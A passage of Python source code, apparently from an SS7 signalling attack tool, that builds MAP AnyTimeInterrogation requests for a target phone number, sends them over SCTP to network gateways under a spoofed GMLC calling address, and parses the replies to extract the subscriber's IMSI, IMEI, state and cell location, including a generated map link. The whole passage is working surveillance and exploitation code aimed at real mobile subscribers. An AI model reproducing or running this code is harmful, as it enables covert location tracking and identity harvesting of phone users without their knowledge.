    result = bytearray([0x91])  # International
    
    for i in range(0, len(digits), 2):
        d1 = int(digits[i])
        d2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
        result.append((d2 << 4) | d1)
    
    return bytes(result)

def build_complete_ati(target_msisdn: str, unique_id: str = "", real_time_logger: Optional[RealTimeLogger] = None) -> Tuple[Optional[bytes], Optional[str], Optional[int]]:
    """Build complete ATI with all mandatory fields - DO NOT MODIFY - Enhanced with logging"""
    try:
        if real_time_logger:
            real_time_logger.log_transmission(unique_id, "✅ FIXED ATI arguments set successfully using method: minimal_mandatory")
        
        # Get ATI instance using deepcopy (we know this works)
        ati_arg = deepcopy(MAP_MS.AnyTimeInterrogationArg)
        
        # Encode MSISDNs
        target_msisdn_bytes = format_msisdn_bcd(target_msisdn)
        scf_msisdn_bytes = format_msisdn_bcd(AUTO_CONFIG['CGPA_GT'])
        
        if real_time_logger:
            real_time_logger.log_transmission(unique_id, f"✅ MAP parameter generated: {len(target_msisdn_bytes) + len(scf_msisdn_bytes)} bytes")
        
        # Build complete ATI dictionary with ALL mandatory fields
        ati_complete = {
            # Mandatory field 1: subscriberIdentity
            'subscriberIdentity': ('msisdn', target_msisdn_bytes),
            
            # Mandatory field 2: requestedInfo (cannot be empty)
            'requestedInfo': {
                'locationInformation': b'',  # Empty but present
                'subscriberState': b''       # Empty but present
            },
            
            # Mandatory field 3: gsmSCF-Address
            'gsmSCF-Address': scf_msisdn_bytes
        }
        
        # Set the complete values
        method_used = ""
        try:
            ati_arg.set_val(ati_complete)
            method_used = "complete_professional"
            if real_time_logger:
                real_time_logger.log_transmission(unique_id, "✅ Parameter set successfully via from_ber")
        except Exception as e:
            # Try alternative: build RequestedInfo separately
            try:
                # Create RequestedInfo separately
                req_info = deepcopy(MAP_MS.RequestedInfo)
                
                # Try different ways to set RequestedInfo
                try:
                    # Method 1: Set individual flags
                    req_info_dict = {}
                    req_info_dict['locationInformation'] = None
                    req_info_dict['subscriberState'] = None
                    req_info.set_val(req_info_dict)
                    method_used = "individual_flags"
                except:
                    try:
                        # Method 2: Set as boolean flags
                        req_info_dict = {}
                        req_info_dict['locationInformation'] = True
                        req_info_dict['subscriberState'] = True  
                        req_info.set_val(req_info_dict)
                        method_used = "boolean_flags"
                    except:
                        # Method 3: Set as empty dict
                        req_info.set_val({})
                        method_used = "empty_dict"
                
                # Now build ATI with proper RequestedInfo
                ati_alternative = {
                    'subscriberIdentity': ('msisdn', target_msisdn_bytes),
                    'requestedInfo': req_info.get_val(),
                    'gsmSCF-Address': scf_msisdn_bytes
                }
                
                ati_arg.set_val(ati_alternative)
                
            except Exception as e2:
                # Last resort: minimal but valid ATI
                try:
                    minimal_ati = {
                        'subscriberIdentity': ('msisdn', target_msisdn_bytes),
                        'gsmSCF-Address': scf_msisdn_bytes,
                        'requestedInfo': {
                            'locationInformation': None
                        }
                    }
                    ati_arg.set_val(minimal_ati)
                    method_used = "minimal_mandatory"
                except Exception as e3:
                    logger.error(f"[{unique_id}] All ATI methods failed: {e3}")
                    if real_time_logger:
                        real_time_logger.log_error(unique_id, "PDU_BUILD_ERROR", f"All ATI construction methods failed: {e3}")
                    return None, None, None
        
        # Convert to BER
        param_ber = ati_arg.to_ber()
        
        # Build TCAP
        # Build Invoke
        invoke = deepcopy(TCAP_MSGS.Invoke)
        invoke_id = random.randint(1, 127)
        
        invoke.set_val({
            'invokeID': invoke_id,
            'opCode': ('localValue', MapOperations.ANY_TIME_INTERROGATION)
        })
        
        # Set parameter
        try:
            invoke._cont['parameter'].from_ber(param_ber)
        except Exception as pe:
            try:
                invoke._cont['parameter']._val = param_ber
            except Exception as pe2:
                if real_time_logger:
                    real_time_logger.log_error(unique_id, "PARAMETER_ERROR", f"Parameter setting failed: {pe}, {pe2}")
                return None, None, None
        
        # Build Component
        component = deepcopy(TCAP_MSGS.Component)
        component.set_val(('invoke', invoke.get_val()))
        
        # Build Begin
        begin = deepcopy(TCAP_MSGS.Begin)
        otid = os.urandom(4)
        
        begin.set_val({
            'otid': otid,
            'components': [component.get_val()]
        })
        
        # Build TC Message
        tc_msg = deepcopy(TCAP_MSGS.TCMessage)
        tc_msg.set_val(('begin', begin.get_val()))
        
        tcap_bytes = tc_msg.to_ber()
        
        otid_hex = otid.hex()
        
        if real_time_logger:
            real_time_logger.log_transmission(unique_id, f"🎯 TCAP built successfully: {len(tcap_bytes)} bytes, OTID: {otid_hex}, InvokeID: {invoke_id}")
        
        logger.debug(f"[{unique_id}] TCAP built: {len(tcap_bytes)} bytes, OTID: {otid_hex}, InvokeID: {invoke_id}")
        
        return tcap_bytes, otid_hex, invoke_id
        
    except Exception as e:
        logger.error(f"[{unique_id}] Complete build failed: {e}")
        if real_time_logger:
            real_time_logger.log_error(unique_id, "BUILD_ERROR", f"Complete build failed: {e}")
        return None, None, None

def build_sccp_wrapper(tcap_data: bytes, target_msisdn: str, unique_id: str = "", real_time_logger: Optional[RealTimeLogger] = None) -> bytes:
    """Build SCCP wrapper - DO NOT MODIFY - Enhanced with logging"""
    if not SCCP_MODULE or not tcap_data:
        return tcap_data
    
    try:
        if real_time_logger:
            real_time_logger.log_transmission(unique_id, "🏗️ Building professional SCCP wrapper")
        
        sccp_udt = SCCP_MODULE.SCCPUnitData()
        
        # Called party (HLR)
        cdpa = SCCP_MODULE._SCCPAddr()
        cdpa['AddrInd']['res'].set_val(0)
        cdpa['AddrInd']['RoutingInd'].set_val(1)
        cdpa['AddrInd']['GTInd'].set_val(4)
        cdpa['AddrInd']['SSNInd'].set_val(1)
        cdpa['AddrInd']['PCInd'].set_val(0)
        cdpa['SSN'].set_val(SSN.HLR)
        
        gt4_cdpa = cdpa['GT'].get_alt()
        gt4_cdpa['TranslationType'].set_val(0)
        gt4_cdpa['NumberingPlan'].set_val(1)
        gt4_cdpa['EncodingScheme'].set_val(1)
        gt4_cdpa['spare'].set_val(0)
        gt4_cdpa['NAI'].set_val(4)
        gt4_cdpa.set_addr_bcd(target_msisdn)
        
        # Calling party (us)
        cgpa = SCCP_MODULE._SCCPAddr()
        cgpa['AddrInd']['res'].set_val(0)
        cgpa['AddrInd']['RoutingInd'].set_val(1)
        cgpa['AddrInd']['GTInd'].set_val(4)
        cgpa['AddrInd']['SSNInd'].set_val(1)
        cgpa['AddrInd']['PCInd'].set_val(0)
        cgpa['SSN'].set_val(SSN.GMLC)
        
        gt4_cgpa = cgpa['GT'].get_alt()
        gt4_cgpa['TranslationType'].set_val(0)
        gt4_cgpa['NumberingPlan'].set_val(1)
        gt4_cgpa['EncodingScheme'].set_val(1)
        gt4_cgpa['spare'].set_val(0)
        gt4_cgpa['NAI'].set_val(4)
        gt4_cgpa.set_addr_bcd(AUTO_CONFIG['CGPA_GT'])
        
        # Build UDT
        sccp_udt.set_val({
            'Type': 9,
            'ProtocolClass': {'Handling': 0, 'Class': 0},
            'Pointers': {'Ptr0': 0, 'Ptr1': 0, 'Ptr2': 0},
            'CalledPartyAddr': {'Len': 0, 'Value': cdpa.get_val()},
            'CallingPartyAddr': {'Len': 0, 'Value': cgpa.get_val()},
            'Data': {'Len': len(tcap_data), 'Value': tcap_data}
        })
        
        sccp_bytes = sccp_udt.to_bytes()
        
        if real_time_logger:
            real_time_logger.log_transmission(unique_id, f"✅ Professional SCCP wrapper built: {len(sccp_bytes)} bytes")
            real_time_logger.log_transmission(unique_id, f"📡 SCCP addresses: CDPA(HLR)={target_msisdn}, CGPA(GMLC)={AUTO_CONFIG['CGPA_GT']}")
            real_time_logger.log_transmission(unique_id, f"✅ Message built successfully: {len(sccp_bytes)} bytes")
        
        logger.debug(f"[{unique_id}] SCCP built: {len(sccp_bytes)} bytes")
        
        return sccp_bytes
        
    except Exception as e:
        logger.error(f"[{unique_id}] SCCP failed: {e}")
        if real_time_logger:
            real_time_logger.log_error(unique_id, "SCCP_ERROR", f"SCCP wrapper failed: {e}")
        return tcap_data

# ================================
# ADVANCED TCAP/MAP ANALYSIS ENGINE - DO NOT MODIFY THESE FUNCTIONS
# ================================

def analyze_tcap_comprehensive(response_bytes: bytes, unique_id: str) -> TcapAnalysis:
    """Comprehensive TCAP analysis with complete component extraction"""
    
    analysis = TcapAnalysis()
    
    if not PYCRATE_AVAILABLE or not TCAP_MSGS:
        analysis.error_message = "TCAP analysis modules not available"
        return analysis
    
    try:
        logger.debug(f"[{unique_id}] Starting comprehensive TCAP analysis")
        
        # Parse TCAP message
        tcap_msg = TCAP_MSGS.TCMessage()
        tcap_msg.from_ber(response_bytes)
        
        raw_structure = tcap_msg.get_val()
        analysis.raw_structure = raw_structure
        
        # Extract message type and data
        if isinstance(raw_structure, tuple):
            msg_type, msg_data = raw_structure
            analysis.message_type = msg_type
            
            logger.debug(f"[{unique_id}] TCAP message type: {msg_type}")
            
            # Extract transaction ID
            if 'otid' in msg_data:
                analysis.transaction_id = msg_data['otid'].hex()
            elif 'dtid' in msg_data:
                analysis.transaction_id = msg_data['dtid'].hex()
            
            # Analyze dialogue portion
            if 'dialoguePortion' in msg_data:
                analysis.dialogue_portion = analyze_dialogue_portion(msg_data['dialoguePortion'], unique_id)
                
                # Extract application context
                if 'application-context-name' in analysis.dialogue_portion:
                    analysis.application_context = str(analysis.dialogue_portion['application-context-name'])
            
            # Analyze components
            if 'components' in msg_data:
                for component in msg_data['components']:
                    component_analysis = analyze_tcap_component_comprehensive(component, unique_id)
                    analysis.components.append(component_analysis)
            
            analysis.analysis_success = True
            logger.info(f"[{unique_id}] TCAP analysis completed successfully: {msg_type} with {len(analysis.components)} components")
            
        else:
            analysis.error_message = f"Unexpected TCAP structure: {type(raw_structure)}"
            logger.error(f"[{unique_id}] {analysis.error_message}")
        
    except Exception as e:
        analysis.error_message = f"TCAP analysis failed: {str(e)}"
        logger.error(f"[{unique_id}] {analysis.error_message}")
        logger.debug(f"[{unique_id}] TCAP analysis traceback: {traceback.format_exc()}")
    
    return analysis

def analyze_dialogue_portion(dialogue_data: Dict, unique_id: str) -> Dict[str, Any]:
    """Analyze TCAP dialogue portion"""
    try:
        dialogue_analysis = {}
        
        if isinstance(dialogue_data, tuple):
            dialogue_type, dialogue_content = dialogue_data
            dialogue_analysis['dialogue_type'] = dialogue_type
            
            if 'application-context-name' in dialogue_content:
                dialogue_analysis['application-context-name'] = dialogue_content['application-context-name']
            
            if 'user-information' in dialogue_content:
                dialogue_analysis['user-information'] = dialogue_content['user-information']
                
            if 'protocol-version' in dialogue_content:
                dialogue_analysis['protocol-version'] = dialogue_content['protocol-version']
                
        logger.debug(f"[{unique_id}] Dialogue portion analyzed: {dialogue_analysis.get('dialogue_type', 'unknown')}")
        return dialogue_analysis
        
    except Exception as e:
        logger.error(f"[{unique_id}] Dialogue portion analysis failed: {e}")
        return {'error': str(e)}

def analyze_tcap_component_comprehensive(component: Dict, unique_id: str) -> Dict[str, Any]:
    """Comprehensive analysis of a single TCAP component"""
    
    component_analysis = {
        'component_type': '',
        'invoke_id': None,
        'operation_code': None,
        'parameter_data': None,
        'parameter_analysis': {},
        'error_code': None,
        'error_parameter': None,
        'problem_code': None,
        'result_data': None,
        'analysis_success': False
    }
    
    try:
        if isinstance(component, tuple):
            comp_type, comp_data = component
            component_analysis['component_type'] = comp_type
            
            # Analyze Invoke component
            if comp_type == 'invoke':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'opCode' in comp_data:
                    op_code = comp_data['opCode']
                    if isinstance(op_code, tuple) and op_code[0] == 'localValue':
                        component_analysis['operation_code'] = op_code[1]
                
                # Extract and analyze parameter
                if 'parameter' in comp_data:
                    component_analysis['parameter_data'] = comp_data['parameter']
                    
                    if component_analysis['operation_code']:
                        component_analysis['parameter_analysis'] = analyze_map_parameter(
                            component_analysis['operation_code'],
                            comp_data['parameter'],
                            unique_id
                        )
            
            # Analyze ReturnResultLast component (Success response)
            elif comp_type == 'returnResultLast':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'result' in comp_data:
                    result_data = comp_data['result']
                    component_analysis['result_data'] = result_data
                    
                    if 'opCode' in result_data:
                        op_code = result_data['opCode']
                        if isinstance(op_code, tuple) and op_code[0] == 'localValue':
                            component_analysis['operation_code'] = op_code[1]
                    
                    # This is the crucial part for ATI result analysis
                    if 'parameter' in result_data:
                        component_analysis['parameter_data'] = result_data['parameter']
                        component_analysis['parameter_analysis'] = analyze_map_result_comprehensive(
                            component_analysis['operation_code'],
                            result_data['parameter'],
                            unique_id
                        )
            
            # Analyze ReturnError component
            elif comp_type == 'returnError':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'errorCode' in comp_data:
                    error_code = comp_data['errorCode']
                    if isinstance(error_code, tuple) and error_code[0] == 'localValue':
                        component_analysis['error_code'] = error_code[1]
                
                if 'parameter' in comp_data:
                    component_analysis['error_parameter'] = comp_data['parameter']
            
            # Analyze Reject component
            elif comp_type == 'reject':
                component_analysis['invoke_id'] = comp_data.get('invokeID')
                
                if 'problem' in comp_data:
                    component_analysis['problem_code'] = comp_data['problem']
            
            component_analysis['analysis_success'] = True
            logger.debug(f"[{unique_id}] Component analyzed: {comp_type}")
            
    except Exception as e:
        component_analysis['error_message'] = str(e)
        logger.error(f"[{unique_id}] Component analysis failed: {e}")
    
    return component_analysis

def analyze_map_parameter(operation_code: int, parameter_data: bytes, unique_id: str) -> Dict[str, Any]:
    """Analyze MAP parameter for requests"""
    analysis = {}
    
    try:
        if operation_code == MapOperations.ANY_TIME_INTERROGATION:
            # Analyze ATI request parameter
            if PYCRATE_AVAILABLE and MAP_MS:
                ati_arg = MAP_MS.AnyTimeInterrogationArg()
                ati_arg.from_ber(parameter_data)
                
                request_data = ati_arg.get_val()
                analysis['request_type'] = 'AnyTimeInterrogationArg'
                analysis['subscriber_identity'] = request_data.get('subscriberIdentity')
                analysis['requested_info'] = request_data.get('requestedInfo')
                analysis['gsmscf_address'] = request_data.get('gsmSCF-Address')
                
        logger.debug(f"[{unique_id}] MAP parameter analyzed for operation {operation_code}")
        
    except Exception as e:
        analysis['error'] = str(e)
        logger.error(f"[{unique_id}] MAP parameter analysis failed: {e}")
    
    return analysis

def analyze_map_result_comprehensive(operation_code: int, parameter_data: bytes, unique_id: str) -> Dict[str, Any]:
    """Comprehensive MAP result analysis - THE CORE EXTRACTION ENGINE"""
    
    analysis = {
        'operation_code': operation_code,
        'extracted_data': {},
        'location_info': {},
        'subscriber_info': {},
        'equipment_info': {},
        'network_data': {},
        'analysis_success': False,
        'raw_data': parameter_data.hex() if parameter_data else ''
    }
    
    try:
        if operation_code == MapOperations.ANY_TIME_INTERROGATION and PYCRATE_AVAILABLE and MAP_MS:
            logger.info(f"[{unique_id}] Analyzing ATI result - CORE DATA EXTRACTION")
            
            # Parse AnyTimeInterrogationRes
            ati_result = MAP_MS.AnyTimeInterrogationRes()
            ati_result.from_ber(parameter_data)
            
            result_data = ati_result.get_val()
            analysis['raw_result_structure'] = result_data
            
            # Extract subscriber information
            if 'subscriberInfo' in result_data:
                subscriber_info = result_data['subscriberInfo']
                
                # Extract IMSI - CRITICAL DATA
                if 'imsi' in subscriber_info:
                    imsi_bytes = subscriber_info['imsi']
                    analysis['subscriber_info']['imsi'] = decode_imsi_from_bytes(imsi_bytes)
                    logger.info(f"[{unique_id}] ✅ IMSI EXTRACTED: {analysis['subscriber_info']['imsi']}")
                
                # Extract Location Information - CRITICAL DATA
                if 'locationInformation' in subscriber_info:
                    location_data = subscriber_info['locationInformation']
                    location_analysis = extract_location_information_comprehensive(location_data, unique_id)
                    analysis['location_info'] = location_analysis
                    
                    if location_analysis.get('cell_global_identity'):
                        cgi = location_analysis['cell_global_identity']
                        logger.info(f"[{unique_id}] ✅ LOCATION EXTRACTED: {cgi['mcc']}-{cgi['mnc']}-{cgi['lac']}-{cgi['cell_id']}")
                
                # Extract Subscriber State
                if 'subscriberState' in subscriber_info:
                    state_data = subscriber_info['subscriberState']
                    analysis['subscriber_info']['state'] = extract_subscriber_state_comprehensive(state_data)
                    logger.info(f"[{unique_id}] ✅ SUBSCRIBER STATE: {analysis['subscriber_info']['state']}")
                
                # Extract Equipment Status and IMEI
                if 'equipmentStatus' in subscriber_info:
                    equipment_data = subscriber_info['equipmentStatus']
                    analysis['equipment_info']['status'] = str(equipment_data)
                
                # Extract PS Subscriber State (for GPRS/LTE)
                if 'ps-SubscriberState' in subscriber_info:
                    ps_state = subscriber_info['ps-SubscriberState']
                    analysis['subscriber_info']['ps_state'] = str(ps_state)
                
                # Extract IMEI if available
                if 'imei' in subscriber_info:
                    imei_bytes = subscriber_info['imei']
                    analysis['equipment_info']['imei'] = decode_imei_from_bytes(imei_bytes)
                    logger.info(f"[{unique_id}] ✅ IMEI EXTRACTED: {analysis['equipment_info']['imei']}")
                
                # Extract MS Network Capability
                if 'ms-NetworkCapability' in subscriber_info:
                    network_cap = subscriber_info['ms-NetworkCapability']
                    analysis['network_data']['ms_network_capability'] = network_cap.hex()
                
                # Extract MS Radio Access Capability
                if 'ms-RadioAccessCapability' in subscriber_info:
                    radio_cap = subscriber_info['ms-RadioAccessCapability']
                    analysis['network_data']['ms_radio_access_capability'] = radio_cap.hex()
            
            analysis['analysis_success'] = True
            logger.info(f"[{unique_id}] 🎉 MAP ATI RESULT ANALYSIS COMPLETED SUCCESSFULLY")
            
        else:
            logger.debug(f"[{unique_id}] No specific analysis for operation code {operation_code}")
            analysis['extracted_data']['operation_code'] = operation_code
            analysis['extracted_data']['raw_parameter'] = parameter_data.hex()
        
    except Exception as e:
        analysis['error_message'] = str(e)
        logger.error(f"[{unique_id}] MAP result analysis failed: {e}")
        logger.debug(f"[{unique_id}] Analysis traceback: {traceback.format_exc()}")
    
    return analysis

def decode_imsi_from_bytes(imsi_bytes: bytes) -> str:
    """Decode IMSI from BCD bytes according to 3GPP TS 29.002"""
    try:
        if not imsi_bytes or len(imsi_bytes) < 3:
            return ""
        
        # First byte contains length, skip it if present
        if len(imsi_bytes) > 8:
            imsi_bytes = imsi_bytes[1:]
        
        imsi_digits = ""
        for byte_val in imsi_bytes:
            # Extract nibbles (BCD encoding)
            low_nibble = byte_val & 0x0F
            high_nibble = (byte_val & 0xF0) >> 4
            
            if low_nibble <= 9:
                imsi_digits += str(low_nibble)
            if high_nibble <= 9:
                imsi_digits += str(high_nibble)
            elif high_nibble == 0xF:
                break  # Padding reached
        
        return imsi_digits
        
    except Exception as e:
        logger.error(f"IMSI decoding failed: {e}")
        return ""

def decode_imei_from_bytes(imei_bytes: bytes) -> str:
    """Decode IMEI from BCD bytes"""
    try:
        if not imei_bytes:
            return ""
        
        imei_digits = ""
        for byte_val in imei_bytes:
            low_nibble = byte_val & 0x0F
            high_nibble = (byte_val & 0xF0) >> 4
            
            if low_nibble <= 9:
                imei_digits += str(low_nibble)
            if high_nibble <= 9:
                imei_digits += str(high_nibble)
            elif high_nibble == 0xF:
                break
        
        return imei_digits
        
    except Exception as e:
        logger.error(f"IMEI decoding failed: {e}")
        return ""

def extract_location_information_comprehensive(location_data: Dict, unique_id: str) -> Dict[str, Any]:
    """Comprehensive location information extraction"""
    
    location_info = {
        'cell_global_identity': {},
        'location_area_identity': {},
        'vlr_number': '',
        'location_number': '',
        'current_location_retrieved': False,
        'age_of_location_information': None,
        'geographical_information': {},
        'state_of_location': '',
        'google_maps_data': {},
        'extraction_success': False
    }
    
    try:
        # Extract Cell Global Identity - MOST CRITICAL
        if 'cellGlobalIdOrServiceAreaIdOrLAI' in location_data:
            cgi_data = location_data['cellGlobalIdOrServiceAreaIdOrLAI']
            
            if isinstance(cgi_data, tuple):
                choice_type, choice_data = cgi_data
                
                if choice_type == 'cellGlobalIdOrServiceAreaIdFixedLength':
                    cgi_bytes = choice_data
                    if len(cgi_bytes) >= 7:
                        # Parse CGI according to 3GPP TS 29.002
                        mcc_mnc_bytes = cgi_bytes[:3]
                        lac = struct.unpack('>H', cgi_bytes[3:5])[0]
                        cell_id = struct.unpack('>H', cgi_bytes[5:7])[0]
                        
                        # Decode MCC/MNC
                        mcc, mnc = decode_mcc_mnc_from_bcd(mcc_mnc_bytes)
                        
                        location_info['cell_global_identity'] = {
                            'mcc': mcc,
                            'mnc': mnc,
                            'lac': lac,
                            'cell_id': cell_id,
                            'raw_cgi': cgi_bytes.hex(),
                            'operator_info': lookup_operator_info(mcc, mnc)
                        }
                        
                        # Generate basic location data (network-based analysis)
                        basic_location = LocationInfo(
                            mcc=mcc, mnc=mnc, lac=lac, cell_id=cell_id,
                            raw_cgi=f"{mcc}-{mnc}-{lac:04X}-{cell_id:04X}"
                        )
                        
                        # Get operator information immediately
                        operator_info = lookup_operator_info(mcc, mnc)
                        basic_location.operator_name = operator_info.get('name', 'Unknown')
                        basic_location.technology = operator_info.get('technology', [])
                        basic_location.country = operator_info.get('country', 'Unknown')
                        
                        # Basic network-based location estimation
                        coordinates = estimate_location_from_lac(mcc, mnc, lac)
                        if coordinates:
                            basic_location.coordinates = coordinates
                            basic_location.google_maps_url = f"https://maps.google.com/?q={coordinates[0]},{coordinates[1]}"
                            basic_location.location_accuracy = 'network_analysis'
                            basic_location.data_sources = ['Network_Analysis']
                        
                        location_info['google_maps_data'] = asdict(basic_location)
                        
                        logger.info(f"[{unique_id}] 🌍 CELL LOCATION: {mcc}-{mnc}-{lac}-{cell_id} ({basic_location.operator_name})")
        
        # Extract VLR Number
        if 'vlr-number' in location_data:
            vlr_data = location_data['vlr-number']
            location_info['vlr_number'] = decode_address_string(vlr_data)
            logger.debug(f"[{unique_id}] VLR Number: {location_info['vlr_number']}")
        
        # Extract MSC Number
        if 'msc-number' in location_data:
            msc_data = location_data['msc-number']
            location_info['msc_number'] = decode_address_string(msc_data)
            logger.debug(f"[{unique_id}] MSC Number: {location_info['msc_number']}")
        
        # Extract Age of Location Information
        if 'ageOfLocationInformation' in location_data:
            location_info['age_of_location_information'] = location_data['ageOfLocationInformation']
        
        # Extract Geographical Information (if available)
        if 'geographicalInformation' in location_data:
            geo_data = location_data['geographicalInformation']
            location_info['geographical_information'] = decode_geographical_information(geo_data)
        
        # Extract Current Location Retrieved flag
        if 'currentLocationRetrieved' in location_data:
            location_info['current_location_retrieved'] = bool(location_data['currentLocationRetrieved'])
        
        location_info['extraction_success'] = True
        
    except Exception as e:
        logger.error(f"[{unique_id}] Location information extraction failed: {e}")
        location_info['error'] = str(e)
    
    return location_info

def decode_address_string(address_data: bytes) -> str:
    """Decode AddressString according to 3GPP TS 29.002"""
    try:
        if not address_data or len(address_data) < 2:
            return ""
        
        # First byte contains nature of address and numbering plan
        nai_np = address_data[0]
        
        # Remaining bytes contain BCD-encoded digits
        digits = ""
        for byte_val in address_data[1:]:
            low_nibble = byte_val & 0x0F
            high_nibble = (byte_val & 0xF0) >> 4
            
            if low_nibble <= 9:
                digits += str(low_nibble)
            if high_nibble <= 9:
                digits += str(high_nibble)
            elif high_nibble == 0xF:
                break
        
        return digits
        
    except Exception as e:
        logger.error(f"AddressString decoding failed: {e}")
        return ""

def decode_geographical_information(geo_data: bytes) -> Dict[str, Any]:
    """Decode geographical information according to 3GPP TS 23.032"""
    try:
        if not geo_data or len(geo_data) < 8:
            return {}
        
        # This is a simplified implementation
        # Full implementation would handle all geographical information formats
        
        geo_info = {
            'type_of_shape': geo_data[0] & 0x0F,
            'raw_data': geo_data.hex()
        }
        
        # Extract coordinates if it's an ellipsoid point
        if geo_info['type_of_shape'] == 0:  # Ellipsoid point
            if len(geo_data) >= 7:
                latitude_sign = (geo_data[1] & 0x80) >> 7
                latitude = struct.unpack('>I', b'\x00' + geo_data[1:4])[0] & 0x7FFFFF
                longitude = struct.unpack('>I', b'\x00' + geo_data[4:7])[0] & 0x7FFFFF
                
                # Convert to decimal degrees
                lat_decimal = (latitude * 90) / (2**23)
                if latitude_sign:
                    lat_decimal = -lat_decimal
                
                lon_decimal = (longitude * 360) / (2**24)
                if lon_decimal > 180:
                    lon_decimal -= 360
                
                geo_info['latitude'] = lat_decimal
                geo_info['longitude'] = lon_decimal
        
        return geo_info
        
    except Exception as e:
        logger.error(f"Geographical information decoding failed: {e}")
        return {'error': str(e), 'raw_data': geo_data.hex()}

def extract_subscriber_state_comprehensive(state_data) -> str:
    """Extract and decode subscriber state"""
    try:
        if isinstance(state_data, tuple):
            state_type, state_value = state_data
            return f"{state_type}: {state_value}"
        else:
            return str(state_data)
    except Exception as e:
        logger.error(f"Subscriber state extraction failed: {e}")
        return "Unknown"

# ================================
# ENHANCED NETWORK OPERATIONS WITH REAL-TIME LOGGING
# ================================

def send_ati_request_professional(target: TargetInfo, ati_variant: AtiVariant = AtiVariant.BASIC,
                                 cgpa_gt: str = "212600000001", timeout: int = 10, 
                                 real_time_logger: Optional[RealTimeLogger] = None) -> EnhancedScanResult:
    """Professional ATI request with comprehensive analysis and real-time logging"""
    
    unique_id = f"{target.ip}:{target.port}_{target.msisdn}_{int(time.time())}"
    start_time = time.time()
    
    # Initialize enhanced result structure
    result = EnhancedScanResult(
        target=target,
        result=ScanResult.UNKNOWN_ERROR,
        timestamp=datetime.now(timezone.utc).isoformat(),
        scan_id=SCAN_ID,
        unique_id=unique_id,
        ati_variant=ati_variant.value
    )
    
    try:
        logger.info(f"[{unique_id}] 🚀 Starting professional ATI scan: {target}")
        
        # Build professional ATI PDU using working function with real-time logging
        tcap_data, otid_hex, invoke_id = build_complete_ati(target.msisdn, unique_id, real_time_logger)
        
        if not tcap_data:
            result.result = ScanResult.BUILD_ERROR
            result.error_message = "Failed to build professional ATI PDU"
            if real_time_logger:
                real_time_logger.log_error(target.ip, "BUILD_ERROR", result.error_message)
            return result
        
        result.otid = otid_hex or ""
        result.invoke_id = invoke_id
        result.diagnostic_info['tcap_build_success'] = True
        
        # Build professional SCCP wrapper with real-time logging
        final_data = build_sccp_wrapper(tcap_data, target.msisdn, unique_id, real_time_logger)
        result.message_size = len(final_data)
        result.diagnostic_info['sccp_build_success'] = True
        
        # Log gateway communication
        if real_time_logger:
            real_time_logger.log_transmission(target.ip, "🌐 Gateway Communication")
            real_time_logger.log_transmission(target.ip, f"📤 SEND [{len(final_data)} bytes]")
            real_time_logger.log_transmission(target.ip, final_data.hex())
        
        logger.debug(f"[{unique_id}] Professional message built: {len(final_data)} bytes")
        
        # Enhanced transmission display variables
        ssn_used = SSN.GMLC
        gt_used = AUTO_CONFIG['CGPA_GT']
        pdu_construction = "SUCCESS"
        transmission_power = len(final_data)
        bytes_transmitted = 0
        bytes_received = 0
        
        # Send via SCTP with professional error handling
        sock = None
        try:
            sock = sctp.sctpsocket_tcp(socket.AF_INET)
            sock.settimeout(timeout)
            result.diagnostic_info['socket_created'] = True
            
            # Connect with timing
            connect_start = time.time()
            sock.connect((target.ip, target.port))
            connect_time = (time.time() - connect_start) * 1000
            result.diagnostic_info['connection_time_ms'] = connect_time
            
            logger.debug(f"[{unique_id}] Connected in {connect_time:.1f}ms")
            
            # Send data
            sent = sock.sctp_send(final_data, ppid=0)
            bytes_transmitted = sent
            result.diagnostic_info['bytes_sent'] = sent
            
            if sent <= 0:
                result.result = ScanResult.NETWORK_ERROR
                result.error_message = f"Failed to send data (sent: {sent} bytes)"
                pdu_construction = "FAILED"
                transmission_power = 0
                if real_time_logger:
                    real_time_logger.log_error(target.ip, "TRANSMISSION_ERROR", result.error_message, 0)
                return result
            
            logger.debug(f"[{unique_id}] Sent {sent}/{len(final_data)} bytes")
            
            # Receive response with enhanced timeout handling
            try:
                response = sock.recv(4096)
                response_time = (time.time() - start_time) * 1000
                result.response_time_ms = response_time
                result.diagnostic_info['response_received'] = True
                bytes_received = len(response) if response else 0
                
            except socket.timeout:
                result.result = ScanResult.TIMEOUT
                result.error_message = "Response timeout"
                result.response_time_ms = timeout * 1000
                if real_time_logger:
                    real_time_logger.log_error(target.ip, "TIMEOUT", "Response timeout", timeout * 1000)
                return result
            
        finally:
            if sock:
                sock.close()
                result.diagnostic_info['socket_closed'] = True
        
        # Professional response analysis with real-time logging
        if response and len(response) > 0:
            result.response_data = response
            result.response_hex = response.hex()
            
            # Log responses immediately
            if real_time_logger:
                real_time_logger.log_hex_response(target.ip, result.response_hex)
                real_time_logger.log_raw_response(target.ip, response)
            
            logger.info(f"[{unique_id}] 📨 Response received: {len(response)} bytes in {response_time:.1f}ms")
            
            # COMPREHENSIVE PROTOCOL ANALYSIS
            analyze_response_comprehensive(response, result, unique_id, real_time_logger)
            
            # If no specific error found, mark as success
            if result.result == ScanResult.UNKNOWN_ERROR:
                result.result = ScanResult.SUCCESS
                
        else:
            result.result = ScanResult.TIMEOUT
            result.error_message = "No response data received"
            if real_time_logger:
                real_time_logger.log_error(target.ip, "NO_RESPONSE", "No response data received", result.response_time_ms)
        
        # Store enhanced transmission details
        result.additional_info.update({
            'ssn_used': ssn_used,
            'gt_used': gt_used,
            'pdu_construction': pdu_construction,
            'transmission_power': transmission_power,
            'bytes_transmitted': bytes_transmitted,
            'bytes_received': bytes_received
        })
        
        return result
        
    except socket.timeout:
        result.result = ScanResult.TIMEOUT
        result.error_message = "Connection timeout"
        result.response_time_ms = timeout * 1000
        if real_time_logger:
            real_time_logger.log_error(target.ip, "CONNECTION_TIMEOUT", "Connection timeout", timeout * 1000)
        
    except ConnectionRefusedError:
        result.result = ScanResult.CONNECTION_REFUSED
        result.error_message = "Connection refused"
        result.response_time_ms = (time.time() - start_time) * 1000
        if real_time_logger:
            real_time_logger.log_error(target.ip, "CONNECTION_REFUSED", "Connection refused", result.response_time_ms)
        
    except OSError as e:
        result.result = ScanResult.NETWORK_ERROR
        result.error_message = f"Network error: {str(e)}"
        result.response_time_ms = (time.time() - start_time) * 1000
        if real_time_logger:
            real_time_logger.log_error(target.ip, "NETWORK_ERROR", str(e), result.response_time_ms)
        
    except Exception as e:
